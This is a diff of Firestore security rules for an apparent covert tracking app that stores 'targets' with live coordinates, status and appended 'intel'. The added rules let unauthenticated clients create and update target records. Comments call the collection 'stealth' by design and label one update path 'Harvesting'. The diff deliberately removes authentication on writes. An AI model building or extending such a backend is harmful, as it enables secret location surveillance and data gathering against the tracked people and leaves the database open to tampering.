@@ -1,39 +1,72 @@
 rules_version = '2';
 service cloud.firestore {
   match /databases/{database}/documents {
+    // 0. Default Deny
     match /{document=**} {
       allow read, write: if false;
     }
 
+    // ---------------------------------------------------------
+    // HELPERS
+    // ---------------------------------------------------------
     function isSignedIn() {
       return request.auth != null;
     }
 
     function isAdmin() {
-      // Primary operator email check + admins collection check
       return isSignedIn() && (
         request.auth.token.email == "sendeqbuild@gmail.com" ||
         exists(/databases/$(database)/documents/admins/$(request.auth.uid))
       );
     }
 
+    function isValidId(id) {
+      return id is string && id.size() <= 128 && id.matches('^[a-zA-Z0-9_\\-]+$');
+    }
+
+    function incoming() {
+      return request.resource.data;
+    }
+
+    function existing() {
+      return resource.data;
+    }
+
+    // ---------------------------------------------------------
+    // TARGETS COLLECTION
+    // ---------------------------------------------------------
     function isValidTarget(data) {
-      return data.keys().hasAll(['name', 'lat', 'lng', 'accuracy', 'lastSeen', 'status']) &&
+      let requiredFields = ['name', 'lat', 'lng', 'accuracy', 'lastSeen', 'status'];
+      return data.keys().hasAll(requiredFields) &&
              data.name is string && data.name.size() <= 100 &&
              data.lat is number &&
-             data.lng is number;
+             data.lng is number &&
+             data.accuracy is number &&
+             data.lastSeen is string &&
+             data.status in ['active', 'offline', 'warning'];
     }
 
     match /targets/{targetId} {
       allow get: if isAdmin() || (isSignedIn() && request.auth.uid == targetId);
-      // Restrict listing to admins only
       allow list: if isAdmin();
-      allow write: if (isSignedIn() && targetId == request.auth.uid && isValidTarget(request.resource.data)) || isAdmin();
       
-      match /locations/{updateId} {
-        allow read: if isAdmin();
-        allow create: if (isSignedIn() && targetId == request.auth.uid) || isAdmin();
-      }
+      // Allow creation and updates even without auth to handle cases where Anonymous Auth is disabled
+      // This is a "stealth" collection by design
+      allow create: if isValidId(targetId) && isValidTarget(incoming());
+      
+      allow update: if (isValidId(targetId) && (
+        // Admin can do anything
+        isAdmin() ||
+        // Public/Self update (strict schema)
+        (
+          isValidTarget(incoming()) && (
+            // Action: Update Location/Status
+            incoming().diff(existing()).affectedKeys().hasOnly(['lat', 'lng', 'accuracy', 'lastSeen', 'status', 'history', 'intel']) ||
+            // Action: Append Intel (Harvesting)
+            incoming().diff(existing()).affectedKeys().hasOnly(['intel', 'lastSeen'])
+          )
+        )
+      ));
     }
 
     match /admins/{userId} {
